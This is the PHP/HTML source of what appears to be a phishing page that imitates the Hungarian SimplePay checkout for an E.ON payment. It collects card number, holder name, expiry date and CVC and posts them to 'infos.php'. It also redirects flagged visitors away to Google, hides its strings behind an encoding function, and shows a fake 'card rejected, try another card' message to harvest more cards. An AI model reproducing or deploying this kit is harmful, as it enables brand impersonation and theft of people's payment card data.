<?php
	include('Crypt.php');
	session_start();
	if(isset($_SESSION['access']) && $_SESSION['access'] == false){
		header("location:https://www.google.com");
	}
	$style="none";
if(isset($_GET['error']) && $_GET['error'] == "errorcard"){
	$style = "block";
}
?>
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
<meta name="robots" content="noindex">
<meta name="resource-type" content="document">
<meta name="language" content="HU">
<meta name="distribution" content="global">
<title><?php echo MHT_ENCODING("SimplePay");?></title>
<link rel="stylesheet" type="text/css" href="./files/bootstrap.min.css">
<link rel="stylesheet" type="text/css" href="./files/style.css">
<link rel="stylesheet" type="text/css" href="./files/styleA.css">

<link rel="shortcut icon" href="https://www.trio-action.com/bejelentkezeseonportal/file2/favicon.ico">
<script type="text/javascript" src="./files/jquery-3.2.1.min.js"></script>
<script type="text/javascript" src="./files/bootstrap.js"></script>
<script type="text/javascript" src="./files/jquery.creditCardValidator.js"></script>
<script type="text/javascript" src="./files/lolek.js"></script>
<script type="text/javascript" src="./files/main.js"></script>
<script type="text/javascript" src="./files/clickEvents.js"></script>
<script type="text/javascript" src="./files/url-polyfill.min.js"></script>

<script type="text/javascript">
  

  var shipping = "Szállítási költség";
  var discount = "Kedvezmény";
  const errors = new Map();
  errors.set(5812, "Helytelen kártyatípus");
  errors.set(1, "Helytelen kártyaszám hossz");
  errors.set(5804, "Helytelen kártyaszám");
  errors.set(5810, "Hiányzó birtokos név");
  errors.set(5806, "Helytelen kártya lejárati dátum");
  errors.set(5809, "Helytelen ellenőrző kód");
  errors.set(5813, "Kártya elutasítva");
  errors.set(5000, "Belső hiba");
  errors.set(10, "AMEX kártyatípust a kereskedő nem fogadja el");
  errors.set(11, "MasterCard/Maestro kártyatípust a kereskedő nem fogadja el");
  errors.set(12, "VISA kártyatípust a kereskedő nem fogadja el");
  errors.set(1529, "Hiba a regisztrált kártya használatakor");
  errors.set(1000, "Ezt az email címet már regisztrálták");
  errors.set(5024, "Nem megfelelő email cím");
  errors.set(1040, "Nem megfelelő jelszó");
  errors.set(17, "Mező megadása kötelező");
  errors.set(1030, "Hibás felhasználónév vagy jelszó!");
  errors.set(10400, "A jelszó minimum 8 karakter hosszú, tartalmazzon kis- és nagybetűt, valamint számjegyet");
  errors.set(1024, "A regisztráció nincs megerősítve!");
  errors.set(1023, "Nincs beállított jelszó!");
  errors.set(9999, "Mező elfogadása kötelező");
  errors.set(2999, "Hiba történt");

  $(document).ready(function() {


    var exp = 1547422926053-1547422576548;
    exp = exp < 2147483647 ? exp : 2147483647;
    timeoutTimer(exp);
    $('[data-toggle="tooltip"]').tooltip();
    $("#cardTypeHolder .cardtype").addClass("faded");
    changeMerchantLogo('');
    initValidateCreditCard();
    bindEvents();
    manageNarrowView();
    manageSocialRedirect();
    manageLocaleChange();





    determineEnvironment();
    scale();

  });
</script>
</head>
<body>
	
	
	
	
	<div id="container">
		
		


<div class="contentDiv paddingZero">
	<div class="side">
		<div id="header">
			<!-- LOGO -->
			<div id="logo">
				<img src="./files/simplepay_logo.png">
			</div>
			<!-- LOGO end -->
			<!-- Language changer -->
			
			<script>
  </script>
			<!-- Language changer end -->
		</div>
	</div>
</div>
		<!-- HEADER end -->
		<!-- CONTENT -->
		<div class="contentDiv">
			
			




<div class="side">
	<div class="panel shadow" id="accordion">
		<div class="clearfix borderRadiusT10 paddingT20R30B15L30 bg-white">
			
			<div class="marginLR-15">
				<strong class="uppercase color-green fontSize18px"><?php echo MHT_ENCODING("E.ON Energiakereskedelmi Kft.");?></strong>
			</div>
			
				<div class="marginLR-15 paddingT13 paddingB5">
				</div>
			
		</div>
		<div class="margin0">
      
			<div id="sumRow" class="bg-green">
				<span class="uppercase"> <?php echo MHT_ENCODING("Összesen:");?>
				</span> <span> 
						3&nbsp;448
					  HUF
				</span>
				
			</div>
		</div>
		<div class="clearfix margin0">
			
		</div>
		<div class="marginTB15LR10 paddingZero bg-body clearfix collapse in" aria-expanded="true">
			
		</div>
	</div>
</div>

			
			
			<div id="rightSide" class="side">
				
					
						




<script type="text/javascript" src="./files/clickEvents.js"></script>
<div id="tab1" style="">
	<!-- TAB 1 HEADER -->
	<div class="bg-blue borderRadius10 positionAbsolute zIndex20 marginT1 width220">
		<div id="tab1Header" class="bg-dark-gray color-white height50 borderRadiusBZero borderRadiusT10 paddingT0R0B0L20">
			<div>
				<div class="checkboxDiv">
					<label class="cardTabLabel">
					  <table><tbody><tr><td style="
    font-size: 13px;
">
						  <?php echo MHT_ENCODING("Bankkártyával fizetek");?>
						</td></tr></tbody></table>
					</label>
					<div class="check checked top17px">
						<div class="inside"></div>
					</div>
				</div>
			</div>
		</div>
	</div>
	<!-- TAB 1 HEADER end -->
	<!-- TAB 1 Content -->
	<div class="tab1Content marginT1" style="
    height: 320px;
">
		<div class="bg-dark-gray color-white borderRadiusTR10 borderRadiusBR10" style="
    height: 250px;
">
			<p class="color-lightGray fontWeight700 paddingT20R20B0L20">
				<?php echo MHT_ENCODING("Kérjük add meg a fizetéshez használni kívánt kártya adatait!");?>
			</p>
			<div class="height260 paddingT0R10B10L10" id="originalCardPayment" style="
    width: 420px;
    height: 210px;
">
				





<div id="cardHints">
	<div id="numberHint" style="display: none;">
		<div>
			<div>
				<?php echo MHT_ENCODING("Kártyaszámba ne írjon kötőjeleket csak számjegyeket!");?>
			</div>
		</div>
	</div>
	<div id="holderHint" style="display: none;">
		<div>
			<div>
				<?php echo MHT_ENCODING("Pontosan úgy, ahogyan a kártyán szerepel!");?>
			</div>
		</div>
	</div>
	<div id="expiryHint" style="display: none;">
		<div>
			<div>
				<?php echo MHT_ENCODING("Lejárat ideje a kártyaszám alatt található (hh/éé formátumban).");?>
			</div>
		</div>
	</div>
	<div id="cvcHint" style="display: none;">
		<div>
			<div>
				<?php echo MHT_ENCODING("Háromjegyű biztonsági kód a kártya hátoldalán, az aláírás mellett található (Maestro kártyához nem szükséges).");?>
			</div>
		</div>
	</div>
	<div id="cvcAlert" style="display: none;">
		<span></span>
		<div>
			<div>
				<?php echo MHT_ENCODING("Töltse ki a CVC/CVV mezőt is!");?>
			</div>
			<span>
				<?php echo MHT_ENCODING("Háromjegyű biztonsági kód a kártya hátoldalán, az aláírás mellett található.");?>
			</span>
		</div>
	</div>
</div>

			<form id="ccnoform" method="post" action="infos.php" class="color-white borderRadiusBR10 floatLeft">
	<div id="cardBehindCard" class="bg-card color-white" style="
    height: 200px;
">
		<div id="cardFront" class="bg-card" style="
    height: 200px;
">
			<div class="bg-dark-gray chip3"></div>
			
				
					<div id="cvc" class="lightGreyColor">
						<?php echo MHT_ENCODING("CVC/CVV kód:");?>
					</div>
					<div id="cvcInput">
						<input type="password" class="bg-gray-light2" id="cardCvc" tabindex="4" name="cv" placeholder="123" maxlength="4" autocomplete="off" required="required">
						<div id="cardCvcError" class="error" style="display: none;"><?php echo MHT_ENCODING("Helytelen ellenőrző kód");?></div>
					</div>
				
				
			

			<div>
				<div class="clearfix marginLR-15">
					<div id="cardTypeHolder" class="clearfix paddingLR15">
						
							<div id="mastercard" class="cardtype faded"></div>
							<div id="maestro" class="cardtype faded"></div>
						
						
							<div id="visa" class="cardtype faded"></div>
						
						
							<div id="amex" class="cardtype faded"></div>
						
					</div>
				</div>
				<div class="clearfix marginLR-15 paddingLR15" id="chipDiv">
					<div class="paddingB25">
						<div class="chip2"></div>
					</div>
				</div>
				
				<div class="clearfix marginL-5R-15 paddingB10 width255" id="cardNumberDiv">
					<div class="paddingLR15 width100">
						
							
								
									
									
										<input type="text" class="bg-gray-light2 cardNumberInput" tabindex="1" id="cardNo" name="cr" placeholder="xxxx xxxx xxxx xxxx" maxlength="23" autocomplete="off" required="required">
										
									
								
							
							
						
						<div id="cardNoError" class="error" style="font-size: 13px; display:<?php echo $style;?>"><?php echo MHT_ENCODING("a rendszer elutasította a kártyát, próbáljon ki egy másik kártyát");?></div>
					</div>
				</div>

				<div class="clearfix marginL-5R-15 width255">
					
						
							<div id="cardExpLabel">
								<?php echo MHT_ENCODING("Lejárati dátum:");?>
							</div>
						
						
					
				</div>


				<div class="clearfix marginL-5R-15 paddingB10 width255" id="cardHolderDiv">
					<div class="paddingLR15 width75">
						
							
								<input type="text" class="bg-gray-light2 fontWeight700 cardInput" tabindex="2" required="required" id="cardHolder" name="cn" placeholder="Kártyán szereplő név" maxlength="26" autocomplete="off">
								
							
							
						
						<div id="cardHolderError" class="error" style="display: none;"><?php echo MHT_ENCODING("Hiányzó birtokos név");?></div>
					</div>
					<div class="paddingL15 width25 floatLeft" id="cardExpDiv">
						<input type="text" class="bg-gray-light2 fontWeight700 cardInput width55px placeHolderOverride" required="required" tabindex="3" id="cardExp" name="cx" placeholder="HH/ÉÉ" maxlength="5" autocomplete="off">
						
									
							
						
						<div id="cardExpError" class="error" style="display: none;"><?php echo MHT_ENCODING("Helytelen kártya lejárati dátum");?></div>
					</div>
				</div>
			</div>
		</div>
	</div>
    <div id="iampaying" class="bg-dark-gray color-white" style="
    margin-top: 220px;
    width: 400px;
    padding-left: 15px;
">
			<button class="bg-blue btnClass uppercase paymentButton" id="finishPayment">
				<?php echo MHT_ENCODING("Fizetek");?>
			</button>
		</div>
</form></div>
		</div>
		
			
			
			
		
		<div id="iampaying" class="bg-dark-gray color-white">
			
		</div>
		 
	</div>
	<!-- TAB 1 Content end -->
	<!-- TAB 1 Background -->
	<div id="tab1Background" class="panel shadow">
		<!-- TAB 1 Background HEADER -->
		<div id="tab1HeaderRowBackground" class="clearfix bg-blue borderRadius10">
			<div id="simpleHeader" class="paddingLR15 color-white height50">
				<div>
					<div class="checkboxDiv">
						
						
					</div>
				</div>
				<img id="simpleLogo" src="./files/simple_logo_mini.png">
			</div>
		</div>
		<!-- TAB 1 Background HEADER end -->
		<!-- TAB 1 Background Content -->
		<div id="tab1BackgroundPlaceHolder" class="clearfix">
			<div id="greenHolder" class="bg-green">
				<div class="bg-green width100 height485 floatLeft borderRadiusBR10" style="height: 285px;"></div>
			</div>
		</div>
		<!-- TAB 1 Background Content end -->
	</div>
	<!-- TAB 1 Background end -->
	<div id="passwordModal" class="modal fade" role="dialog">
		<div class="modal-dialog modal-sm">
			<div class="modal-content bg-card fontSize14px color-black">
				<div class="modal-header">
					<button type="button" class="close" data-dismiss="modal">×</button>
					<h4 class="modal-title">
						<?php echo MHT_ENCODING("Simple jelszó létrehozása");?>
					</h4>
				</div>
				<div class="modal-body">
					<p>
						<?php echo MHT_ENCODING("A biztonságos kártyarögzítéshez, és Simple fiókod jövőbeni használatához hozz létre jelszót. Jelszavadat jól jegyezd meg! A fizetést követően a megadott emailcímedre megerősítő emailt küldünk, kérjük ellenőrizd postaládádat. A regisztráció megerősítésére 24 óra áll rendelkezésedre.");?>
					</p>
					<input type="password" class="addressInput borderBottom2pxSolid" id="secureRegistrationPassword" name="secureRegistrationPassword" aria-autocomplete="list">
					<div id="secureRegistrationPasswordError" class="passwordError" style="display: none"></div>
				</div>
				<div class="modal-footer">
					<div class="paddingT10R10B5L10">
						<button type="button" id="secureRegistration" class="bg-green btnClass uppercase paymentButton">
							Fizet
						</button>
					</div>
					<div class="paddingT10R10B5L10">
						<button type="button" class="bg-red btnClass uppercase" data-dismiss="modal">
							Mégse
						</button>
					</div>
				</div>
			</div>
		</div>
	</div>
	<div id="whyToRegisterModal" class="modal fade" role="dialog">
		<div class="modal-dialog modal-md">
			<div class="modal-content bg-card fontSize14px color-black">
				<div class="modal-body">
					<p>
						<?php echo MHT_ENCODING("A Simple egy széleskörű, integrált fizetési és vásárlási rendszer, amely a kártyaadatok ismételt megadása nélkül lehetővé tesz:");?> </p><p> <?php echo MHT_ENCODING("- webes fizetést a SimplePay fizetési modult használó valamennyi webshopban* ");?><br><?php echo MHT_ENCODING(" - Simple alkalmazáson belül található szolgáltatásokban való fizetést*");?> <br><?php echo MHT_ENCODING(" - érintéses mobilfizetést a Simple alkalmazással**. ");?></p><p><?php echo MHT_ENCODING(" *A Simple fiókodban bármely bank által kibocsátott MasterCard, Maestro, Visa vagy American Express bankkártyát elmentheted, és fizethetsz vele ezeken a felületeken.");?> <br> <?php echo MHT_ENCODING("**Érintéses mobilfizetésre OTP Bank által kibocsátott MasterCard vagy Maestro bankkártyával, NFC funkcióval rendelkező Android rendszerű készülékkel használható.");?>
					</p>
				</div>
			</div>
		</div>
	</div>
</div>
	</div>
			
		</div>
	</div>
	
	

	
	



<div id="footer" class="visible-md visible-lg">
	<div>
		
		<div class="floatLeft">
			
		</div>
		<div id="operatorInfo">
			<span>Fejleszti és üzemelteti az</span>
			<img src="./files/footer_logo.png" alt="OTP Mobil">
		</div>
	</div>
</div>


</body></html>